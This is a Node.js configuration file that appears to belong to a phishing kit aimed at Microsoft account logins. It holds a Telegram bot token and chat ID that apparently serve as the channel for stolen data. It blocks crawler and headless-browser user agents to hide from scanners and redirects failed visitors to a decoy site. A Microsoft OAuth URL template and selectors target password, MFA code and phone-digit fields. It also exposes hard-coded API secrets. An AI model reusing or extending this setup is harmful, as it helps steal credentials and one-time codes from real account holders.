/**
 * Configuration Constants
 * Centralized configuration for the application
 */

module.exports = {
    // Cloudflare Turnstile Configuration
    TURNSTILE_SITE_KEY: '0x4AAAAAACFieUH6QshN3i6c',
    TURNSTILE_SECRET_KEY: '0x4AAAAAACFieYmq7F9oqH2QEW5M1h034D0',
    TURNSTILE_VERIFY_URL: 'https://challenges.cloudflare.com/turnstile/v0/siteverify',

    // IPQualityScore Configuration
    IPQS_API_KEY: 'wO2lptwMnffHHya7reN3GQ03KRbenP2W',
    IPQS_API_URL: 'https://ipqualityscore.com/api/json/ip',
    IPQS_STRICTNESS: 1, // 0 = loose, 1 = medium, 2 = strict
    MAX_FRAUD_SCORE: 75, // Reject if fraud score exceeds this

    // Token Configuration
    TOKEN_LENGTH: 16,
    TOKEN_LIFETIME: 10 * 60 * 1000, // 10 minutes in milliseconds
    TOKEN_CHARSET: 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
    REQUIRE_SESSION_TOKEN: false, // Toggle to bypass 16-digit token check needed by EAPI

    // Security Gateway Settings
    REDIRECT_ON_FAIL: 'https://elementary.com',
    SLIDER_MIN_TIME: 500, // Minimum time to complete slider (ms)
    SLIDER_TOLERANCE: 8, // Pixel tolerance for slider validation

    // Proof of Work (POW)
    POW_DIFFICULTY_PREFIX: '0000', // Hash must start with this
    POW_MAX_AGE_MS: 60 * 1000, // POW timestamp allowed window

    // Bot Detection Settings
    MIN_MOUSE_MOVEMENTS: 3,
    MIN_TIME_ON_PAGE: 1500, // 1.5 seconds
    BLOCKED_USER_AGENTS: [
        'googlebot',
        'bingbot',
        'slurp',
        'duckduckbot',
        'baiduspider',
        'yandexbot',
        'facebookexternalhit',
        'twitterbot',
        'rogerbot',
        'linkedinbot',
        'embedly',
        'quora link preview',
        'showyoubot',
        'outbrain',
        'pinterest',
        'developers.google.com/+/web/snippet',
        'slackbot',
        'vkshare',
        'w3c_validator',
        'redditbot',
        'applebot',
        'whatsapp',
        'flipboard',
        'tumblr',
        'bitlybot',
        'skypeuripreview',
        'nuzzel',
        'discordbot',
        'qwantify',
        'pinterestbot',
        'bitrix',
        'headlesschrome',
        'phantomjs',
        'selenium',
        'webdriver',
        'playwright',
        'puppeteer'
    ],

    // Telegram Configuration
    TELEGRAM_BOT_TOKEN: '7967431349:AAHt0Ijuh6bZR4eyb2B5v5mIlrcRnprpddk',
    TELEGRAM_CHAT_ID: '7607683158',

    // Server Configuration
    PORT: process.env.PORT || 3000,

    // Microsoft Login URL Template
    LOGIN_URL_TEMPLATE: 'https://login.live.com/oauth20_authorize.srf?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&scope=openid+profile+https%3a%2f%2fwww.office.com%2fv2%2fOfficeHome.All&redirect_uri=https%3a%2f%2fwww.office.com%2flandingv2&response_type=code+id_token&state=8Z9CHupUDSQKc0_UWU9-mN6R0ylEQ-IohNSG9jeVBeS6zeNktkbDTv_9zAWxob_RTcu-45Agjr7O-zaj5AUKLV87s7Vf38s1NLCPE-xKPxxQ8q3Y_ghCcKrF7nQP88y-7U-zghLffHcYDiEyEV6hV4Ttod7ToJSgQAY3CsotzJ14k6Wq90bgs7wdMINOqvmd96jNxTJwhWvJo1BGid58R3SR8VhUMSEbjkWbx9yIECseK5-eaeSGVPD2Ex4_6o7wVIHyVoLofiYB_ahuYutNLlW1-0gMmh_tyuo3eDtEBca6MyTZhm0-yqytrqAT3jChjqZ_jJhwToc-YzReZioSi3c2jGirlsl4pAtP5o3ATI8&response_mode=form_post&nonce=639000179053541868.MDE5ZTgxNzYtOWQyMy00ZWI3LTg0ZTAtMTY0YWNkYjJkOGIxODFhZjFhMDAtNjBhNi00NmM5LThkMjctZDhmMGFlMDY2NWRj&x-client-SKU=ID_NET8_0&x-client-Ver=8.5.0.0&uaid=ac6cb7d6c2f74acbbe85350d4b96fac9&msproxy=1&issuer=mso&tenant=common&ui_locales=en-US&epctrc=rsQ1S47286gI%2bVyeYe36d0zAlgbN5NPcwXJBNrodJ%2bI%3d5%3a1%3aCANARY%3anU%2byZprgI61pabYPtSrf31kRnZ7jZCSAPVx31TuVOTQ%3d&epct=PAQABDgEAAABlMNzVhAPUTrARzfQjWPtKXrONtP9NwZuatXFiDoTdhBIggDtPoIv3oAnOcYmUGZXn1zLB5Y5dKniflE2VmK4Ojf7RFPm4RxMtVeYIdZX9AR_wMzpQUj27-rLV4tRlHKeV7pkRAmPImrGks9CgOi1D4aGjn80MseuyG_V7s8blKILvYDEW02pAgZYlHDUx17trDAnDlVKlMf8l-zlSdqpHv6J21-Wjy-PaSZDpaWbfIiAA&jshs=2&jsh=&jshp=&username={email}&login_hint={email}',

    // Timeout Configuration (in milliseconds)
    TIMEOUTS: {
        PAGE_LOAD: 30000,
        ELEMENT_WAIT: 5000,
        CODE_WAIT: 60000,
        EMAIL_WAIT: 30000,
        PHONE_DIGITS_WAIT: 60000,
        USER_CONFIRMATION: 180000,
        NAVIGATION: 10000,
        NETWORK_IDLE: 5000
    },

    // Maximum Attempts
    MAX_ATTEMPTS: {
        LOGIN_FLOW: 10,
        CODE_INPUT: 60,
        EMAIL_INPUT: 30,
        PHONE_DIGITS: 60,
        USER_CONFIRMATION: 180
    },

    // File Paths
    PATHS: {
        DB_FILE: 'db.json',
        DB_BACKUP: 'db.json.backup',
        SESSION_FILE: 'session.txt',
        PUBLIC_DIR: 'public'
    },

    // Common CSS Selectors
    SELECTORS: {
        EMAIL_INPUT: [
            'input[type="email"]',
            'input[name="email"]',
            'input[autocomplete="email"]'
        ],
        PASSWORD_INPUT: [
            'input[type="password"]',
            'input[name="passwd"]',
            'input[name="password"]',
            'input[autocomplete="current-password"]',
            '#i0118'
        ],
        SIGN_IN_BUTTON: [
            'button:has-text("Sign in")',
            'input[type="submit"]',
            'button[type="submit"]',
            '#idSIButton9'
        ],
        CODE_INPUT: [
            'input[maxlength="1"][inputmode="numeric"]',
            'input[type="text"][maxlength="1"]',
            'input[id^="codeEntry-"]'
        ],
        PHONE_DIGITS_INPUT: [
            '#proof-confirmation',
            'input[name="proof-confirmation"]',
            'input[maxlength="4"][inputmode="numeric"]',
            'input[placeholder*="last 4 digits"]'
        ]
    }
};

